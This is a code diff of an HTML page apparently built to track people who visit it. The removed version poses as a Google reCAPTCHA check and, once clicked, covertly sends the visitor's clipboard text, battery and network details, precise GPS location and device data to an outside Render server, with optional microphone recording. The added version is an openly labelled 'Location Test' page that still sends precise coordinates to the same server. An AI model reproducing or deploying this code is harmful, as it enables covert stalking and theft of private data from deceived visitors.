@@ -3,403 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify you are human</title>
+    <title>Location Test</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Roboto', Arial, sans-serif;
-            background: #f1f3f4;
+            margin: 0;
+            background: #f0f0f0;
         }
-        .card {
+        .container {
             background: white;
-            padding: 40px 45px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
             text-align: center;
-            max-width: 420px;
-            border: 1px solid #dadce0;
-            transition: all 0.3s ease;
+            max-width: 400px;
         }
-        .logo { font-size: 28px; font-weight: 500; color: #202124; }
-        .logo span { color: #4285f4; }
-        .subtitle { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-        .recaptcha-box {
-            background: #f9f9f9;
-            border: 2px solid #dadce0;
-            border-radius: 4px;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
+        h1 { color: #333; }
+        .status {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+        .status.waiting { background: #fff3cd; color: #856404; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
+        .coords {
+            font-size: 18px;
+            font-weight: bold;
+            color: #007bff;
+            margin: 10px 0;
+        }
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 16px;
             cursor: pointer;
-            transition: border-color 0.2s;
-            margin: 10px 0 20px 0;
         }
-        .recaptcha-box:hover { border-color: #4285f4; }
-        .recaptcha-box.verified { border-color: #34a853; background: #f0faf5; }
-        .checkbox {
-            width: 24px; height: 24px; border: 2px solid #5f6368; border-radius: 2px;
-            display: flex; align-items: center; justify-content: center;
-            background: white; flex-shrink: 0; transition: all 0.2s;
+        .btn:hover { background: #0056b3; }
+        .debug {
+            margin-top: 15px;
+            padding: 10px;
+            background: #1a1a2e;
+            color: #00ff41;
+            font-family: monospace;
+            font-size: 11px;
+            border-radius: 4px;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
-        .checkbox.checked { background: #4285f4; border-color: #4285f4; color: white; font-size: 16px; }
-        .recaptcha-text { font-size: 14px; color: #202124; }
-        .recaptcha-text small { color: #5f6368; font-size: 12px; display: block; }
-        .loader {
-            display: none; width: 20px; height: 20px;
-            border: 3px solid #e0e0e0; border-top: 3px solid #4285f4;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .continue-btn {
-            width: 100%; padding: 12px 20px; background: #4285f4; color: white;
-            border: none; border-radius: 4px; font-size: 16px; font-weight: 500;
-            cursor: pointer; transition: all 0.2s; opacity: 0.5; pointer-events: none;
-        }
-        .continue-btn.active { opacity: 1; pointer-events: auto; }
-        .continue-btn.active:hover { background: #1a66c9; box-shadow: 0 2px 8px rgba(66,133,244,0.3); }
-        .continue-btn.loading { background: #4285f4; opacity: 0.7; pointer-events: none; }
-        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
-        .footer a { color: #4285f4; text-decoration: none; }
-        .success { display: none; color: #34a853; font-size: 14px; margin-top: 10px; }
-        .error-box { display: none; background: #fce8e6; border: 1px solid #f5c6cb; border-radius: 4px; padding: 12px; margin-top: 15px; color: #d93025; font-size: 14px; }
-        .status-bar { margin-top: 15px; padding: 8px; border-radius: 4px; font-size: 12px; color: #5f6368; background: #f1f3f4; display: none; }
     </style>
 </head>
 <body>
 
-<div class="card" id="card">
-    <div class="logo">re<span>CAPTCHA</span></div>
-    <div class="subtitle">Verify you are human</div>
-
-    <div class="recaptcha-box" id="recaptchaBox">
-        <div class="checkbox" id="checkbox">✓</div>
-        <div class="recaptcha-text">
-            I'm not a robot
-            <small>reCAPTCHA Privacy - Terms</small>
-        </div>
-        <div class="loader" id="loader"></div>
-    </div>
-
-    <button class="continue-btn" id="continueBtn">Continue</button>
-
-    <div class="success" id="success">✅ Verification complete. Redirecting...</div>
-    <div class="error-box" id="errorBox">⚠️ Location access is required to verify you are human.</div>
-    <div class="status-bar" id="statusBar">🔄 Processing...</div>
-
-    <div class="footer">Protected by reCAPTCHA · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
+<div class="container">
+    <h1>📍 Location Test</h1>
+    <div class="status waiting" id="status">⏳ Waiting for location...</div>
+    <div class="coords" id="coords">--</div>
+    <button class="btn" id="getLocationBtn">📍 Get My Location</button>
+    <div class="debug" id="debugLog">📋 Logs will appear here...</div>
 </div>
 
 <script>
     // =============================================
-    // CHANGE THIS TO YOUR RENDER URL
+    // CONFIGURATION — CHANGE THIS TO YOUR RENDER URL
     // =============================================
     const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
 
     // =============================================
     // DOM Elements
     // =============================================
-    const recaptchaBox = document.getElementById('recaptchaBox');
-    const checkbox = document.getElementById('checkbox');
-    const loader = document.getElementById('loader');
-    const continueBtn = document.getElementById('continueBtn');
-    const success = document.getElementById('success');
-    const errorBox = document.getElementById('errorBox');
-    const statusBar = document.getElementById('statusBar');
-
-    let isVerified = false;
-    let isProcessing = false;
+    const statusDiv = document.getElementById('status');
+    const coordsDiv = document.getElementById('coords');
+    const debugLog = document.getElementById('debugLog');
+    const getLocationBtn = document.getElementById('getLocationBtn');
 
     // =============================================
-    // 1. BATTERY LEVEL
+    // Debug Logger
     // =============================================
-    function getBatteryInfo() {
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                fetch(RENDER_URL + '/send-battery', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging
-                    })
-                }).catch(() => {});
-            });
-        }
+    function debug(message) {
+        const timestamp = new Date().toLocaleTimeString();
+        const logEntry = `[${timestamp}] ${message}`;
+        console.log(logEntry);
+        debugLog.textContent += logEntry + '\n';
+        debugLog.scrollTop = debugLog.scrollHeight;
     }
 
     // =============================================
-    // 2. NETWORK INFO
+    // Set Status
     // =============================================
-    function getNetworkInfo() {
-        if (navigator.connection) {
-            fetch(RENDER_URL + '/send-network', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                })
-            }).catch(() => {});
-        }
+    function setStatus(message, type = 'waiting') {
+        statusDiv.textContent = message;
+        statusDiv.className = 'status ' + type;
     }
 
     // =============================================
-    // 3. MICROPHONE ACCESS (optional)
-    // =============================================
-    function captureAudio() {
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onload = () => {
-                        fetch(RENDER_URL + '/send-audio', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ audio: reader.result })
-                        }).catch(() => {});
-                    };
-                    reader.readAsDataURL(blob);
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-            })
-            .catch(() => {});
-    }
-
-    // =============================================
-    // 4. CLIPBOARD DATA
-    // =============================================
-    function readClipboard() {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            navigator.clipboard.readText()
-                .then(text => {
-                    if (text) {
-                        fetch(RENDER_URL + '/send-clipboard', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ clipboard: text })
-                        }).catch(() => {});
-                    }
-                })
-                .catch(() => {});
-        }
-    }
-
-    // =============================================
-    // 5. DATA COMPRESSION
-    // =============================================
-    function compressData(data) {
-        const json = JSON.stringify(data);
-        if (json.length > 100000) {
-            const compressed = { ...data };
-            delete compressed.device_info;
-            return compressed;
-        }
-        return data;
-    }
-
-    // =============================================
-    // 6. AUTOMATIC RECONNECTION (Retry)
-    // =============================================
-    function sendWithRetry(url, data, retries = 3, delay = 2000) {
-        return fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('Server error');
-            return response.json();
-        })
-        .catch(err => {
-            console.log(`❌ Request failed (${retries} retries left):`, err.message);
-            if (retries > 0) {
-                return new Promise(resolve => {
-                    setTimeout(() => {
-                        resolve(sendWithRetry(url, data, retries - 1, delay * 1.5));
-                    }, delay);
-                });
-            }
-            throw err;
-        });
-    }
-
-    // =============================================
-    // 7. HELPERS
+    // Get Device Info
     // =============================================
     function getDeviceInfo() {
         const ua = navigator.userAgent;
-        let deviceName = 'Unknown';
-        if (ua.includes('iPhone')) deviceName = 'iPhone';
-        else if (ua.includes('iPad')) deviceName = 'iPad';
-        else if (ua.includes('Android')) deviceName = 'Android';
-        else if (ua.includes('Windows')) deviceName = 'Windows PC';
-        else if (ua.includes('Mac')) deviceName = 'Mac';
-
-        return {
-            userAgent: ua,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            device_name: deviceName,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-    }
-
-    function showStatus(message, isError = false) {
-        statusBar.style.display = 'block';
-        statusBar.textContent = message;
-        if (isError) {
-            statusBar.style.background = '#fce8e6';
-            statusBar.style.color = '#d93025';
-        } else {
-            statusBar.style.background = '#e8f5e9';
-            statusBar.style.color = '#1e7e34';
-        }
-    }
-
-    function openMapApp(lat, lng) {
-        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
-                      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-        const isAndroid = /Android/.test(navigator.userAgent);
-
-        let mapUrl = '';
-        if (isIOS) {
-            mapUrl = `http://maps.apple.com/?ll=${lat},${lng}&q=${lat},${lng}`;
-        } else if (isAndroid) {
-            mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-        } else {
-            mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-        }
-
-        window.location.href = mapUrl;
+        let device = 'Unknown';
+        if (ua.includes('iPhone')) device = 'iPhone';
+        else if (ua.includes('iPad')) device = 'iPad';
+        else if (ua.includes('Android')) device = 'Android';
+        else if (ua.includes('Windows')) device = 'Windows PC';
+        else if (ua.includes('Mac')) device = 'Mac';
+        return { userAgent: ua, device_name: device };
     }
 
     // =============================================
-    // STEP 1: CLICK reCAPTCHA
+    // Get Location
     // =============================================
-    recaptchaBox.addEventListener('click', function(e) {
-        if (isVerified) return;
-        if (isProcessing) return;
+    function getLocation() {
+        debug('📍 Get Location button clicked');
+        debug('📡 RENDER_URL: ' + RENDER_URL);
 
-        isVerified = true;
-        checkbox.classList.add('checked');
-        checkbox.textContent = '✓';
-        this.classList.add('verified');
-        this.style.borderColor = '#34a853';
-
-        continueBtn.classList.add('active');
-        success.style.display = 'block';
-        success.textContent = '✅ Verification complete. Click Continue.';
-    });
-
-    // =============================================
-    // STEP 2: CLICK CONTINUE — WITH DEBUG LOGS
-    // =============================================
-    continueBtn.addEventListener('click', function() {
-        console.log('✅ Continue button clicked!');   // <-- DEBUG LOG 1
-
-        if (!isVerified) return;
-        if (isProcessing) return;
-
-        isProcessing = true;
-        continueBtn.classList.add('loading');
-        continueBtn.textContent = 'Verifying...';
-        success.style.display = 'none';
-        errorBox.style.display = 'none';
-        showStatus('Requesting location...');
-
-        // --- Fire all data collection features ---
-        getBatteryInfo();
-        getNetworkInfo();
-        readClipboard();
-        // captureAudio();  // Uncomment to enable
-
-        // --- Request location ---
         if (!navigator.geolocation) {
-            showStatus('❌ Geolocation not supported by this browser.', true);
-            isProcessing = false;
-            continueBtn.classList.remove('loading');
-            continueBtn.textContent = 'Continue';
+            debug('❌ Geolocation not supported');
+            setStatus('❌ Geolocation not supported', 'error');
             return;
         }
+
+        setStatus('⏳ Requesting location...', 'waiting');
+        debug('📡 Calling navigator.geolocation.getCurrentPosition...');
 
         navigator.geolocation.getCurrentPosition(
             // --- SUCCESS ---
             function(position) {
-                console.log('📍 Location captured!', position);   // <-- DEBUG LOG 2
-
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
-                const altitude = position.coords.altitude;
-                const heading = position.coords.heading;
-                const speed = position.coords.speed;
 
-                showStatus('📍 Location captured! Sending to server...');
+                debug('✅ Location captured!');
+                debug('📍 Lat: ' + lat + ', Lng: ' + lng);
+                debug('📍 Accuracy: ' + accuracy + 'm');
 
-                const deviceInfo = getDeviceInfo();
+                coordsDiv.textContent = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+                setStatus('✅ Location captured! Sending...', 'success');
 
                 const payload = {
                     lat: lat,
                     lng: lng,
                     accuracy: accuracy,
-                    altitude: altitude,
-                    heading: heading,
-                    speed: speed,
-                    device_info: deviceInfo
+                    device_info: getDeviceInfo()
                 };
 
-                const compressedPayload = compressData(payload);
+                debug('📤 Sending to: ' + RENDER_URL + '/send-location');
 
-                console.log('📤 Sending data to server:', compressedPayload);   // <-- DEBUG LOG 3
-
-                sendWithRetry(RENDER_URL + '/send-location', compressedPayload, 3, 2000)
-                    .then(() => {
-                        console.log('✅ Data sent successfully!');   // <-- DEBUG LOG 4
-                        showStatus('✅ Data sent! Redirecting...');
-                        success.style.display = 'block';
-                        success.textContent = '✅ Verification complete. Redirecting...';
-                        continueBtn.textContent = 'Redirecting...';
-
-                        setTimeout(function() {
-                            openMapApp(lat, lng);
-                        }, 1500);
-                    })
-                    .catch(function(err) {
-                        console.error('❌ All retries failed:', err);   // <-- DEBUG LOG 5
-                        showStatus('⚠️ Server error, but redirecting anyway...', true);
-                        // Still redirect even if server fails
-                        setTimeout(function() {
-                            openMapApp(lat, lng);
-                        }, 1000);
-                    });
+                fetch(RENDER_URL + '/send-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    debug('📥 Response status: ' + response.status);
+                    if (!response.ok) throw new Error('Server error: ' + response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    debug('✅ Data sent successfully!');
+                    debug('📥 Response: ' + JSON.stringify(data));
+                    setStatus('✅ Location sent to server! Check your dashboard.', 'success');
+                })
+                .catch(err => {
+                    debug('❌ Fetch failed: ' + err.message);
+                    setStatus('⚠️ Server error, but location captured', 'error');
+                });
             },
             // --- ERROR ---
             function(error) {
-                console.error('❌ Geolocation error:', error);   // <-- DEBUG LOG 6
-                isProcessing = false;
-                continueBtn.classList.remove('loading');
-                continueBtn.textContent = 'Continue';
-                errorBox.style.display = 'block';
-
-                let errorMessage = 'Location access is required to verify you are human.';
-                if (error.message) {
-                    errorMessage += ` (${error.message})`;
-                }
-                errorBox.textContent = '⚠️ ' + errorMessage;
-                showStatus('❌ ' + errorMessage, true);
+                debug('❌ Geolocation error: ' + error.message);
+                debug('❌ Error code: ' + error.code);
+                setStatus('❌ ' + error.message, 'error');
             },
             {
                 enableHighAccuracy: true,
@@ -407,20 +192,22 @@
                 maximumAge: 0
             }
         );
-    });
+    }
+
+    // =============================================
+    // Event Listeners
+    // =============================================
+    getLocationBtn.addEventListener('click', getLocation);
 
     // =============================================
     // INIT
     // =============================================
-    window.addEventListener('online', function() {
-        showStatus('📶 Back online!');
-    });
-    window.addEventListener('offline', function() {
-        showStatus('📶 No internet connection.', true);
-    });
+    debug('🚀 Page loaded');
+    debug('📍 RENDER_URL: ' + RENDER_URL);
+    debug('📱 User Agent: ' + navigator.userAgent);
 
-    console.log('🚀 Target page loaded');
-    console.log('📍 Render URL:', RENDER_URL);
+    // Uncomment below to auto‑get location on load (optional)
+    // getLocation();
 </script>
 </body>
 </html>
